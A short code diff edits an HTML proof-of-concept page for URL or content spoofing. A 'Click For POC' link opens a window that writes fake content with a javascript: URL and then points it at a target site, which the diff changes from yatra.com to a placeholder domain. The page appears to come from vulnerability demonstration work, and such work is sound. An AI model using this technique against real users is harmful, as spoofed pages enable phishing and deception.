@@ -6,11 +6,11 @@
         }
 
   function f() {
-    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://yatra.com'");
-
+    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://sitewhichyouwanttobespoofed.com'");
+ 
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
   }
-</script>
+</script> 
  </head>
  <body>
   <center><a href="#" onclick="f()">Click For POC</a></center>
